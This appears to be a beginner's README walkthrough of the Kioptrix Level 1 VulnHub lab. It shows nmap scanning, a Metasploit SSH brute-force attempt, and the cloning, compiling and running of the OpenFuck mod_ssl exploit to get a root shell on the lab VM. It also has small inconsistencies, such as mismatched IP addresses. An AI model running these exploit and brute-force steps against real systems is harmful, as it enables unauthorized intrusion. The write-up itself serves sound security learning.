# Kioptix-level-1-walk-through


### download the machine from https://www.vulnhub.com/entry/kioptrix-level-1-1,22/ 

then launch using VMware 

no credintial are provided 


Notes :
----

make sure your system is upgraded           
sudo apt update && sudo apt upgrade                 
sudo apt install exploitdb 

make sure your main system and the target on the same network

scan the target using nmap 
--
Nmap -sn 192.168.1.*

got the kioptrix vm ip at 

Nmap -sC -sV 192.168.1.104

found some open ports ( -22-80-111,139-445-1009)
  
now lets walkthrough each port and see what we can do (separately and combined):
----


 
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
----

 
 
 nmap -sV -sC 192.168.1.104 -p 22 --script vuln get some result 
 
 CVE-2011-1013 CVSS 7.2
---
 allows local users to cause a denial of service (system crash)

 CVE-2010-4478 CVSS 7.5
---
 which allows remote attackers to bypass the need for knowledge of the shared secret, and successfully authenticate
 
  unfortunately there are no proof of concept or working exploit available online also there are no Metasploit module for them
 
 so I've moved to another approached " brute forcing the service for root credentials " using metaspolit
 ---
 msf > use auxiliary/scanner/ssh/ssh_login
 
msf auxiliary(ssh_login) > set RHOSTS 10.0.0.27
 
RHOSTS => 192.168.1.3
 
msf auxiliary(ssh_login) > set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
 
USERPASS_FILE => /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
 

 msf auxiliary(ssh_login) > run
 
 no promising results , 
  

 
 
 53/tcp   open  domain      ISC BIND 9.4.2
----
 using nmap engine found CVE-2008-0122 CSSV 10.0 vulneraries that causes Denial Of Service Execute Code Memory corruption

 
 There are not any Metasploit modules related to this CVE or any working online exploit
 
 
 
 111/tcp  open  rpcbind     
  ----
  
 sudo showmount -e 192.168.1.104
  
 no files are mounted
  
 139/tcp  open  netbios-ssn Samba smbd 
 ---
 couldn't vefiy any exploit for this exact service
  
  443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
---

search exploit-db for  Apache openssl

This Exploit (https://www.exploit-db.com/exploits/764/) is outdated. Here you can take updated

Download OpenFuck.c

git clone https://github.com/heltonWernik/OpenFuck.git

Install ssl-dev library

apt-get install libssl-dev

It's Compile Time

gcc -o OpenFuck OpenFuck.c -lcrypto

Running the Exploit

./OpenFuck

 ./OpenFuck -h |grep 1.3.20
 

./OpenFuck 0x6a 192.168.1.104 443 -c 40
 
 id 
 
root
Thanks for taking some time reading this i hope it was useful please don't hesitate correcting me any mistake for giving me advise
 ----
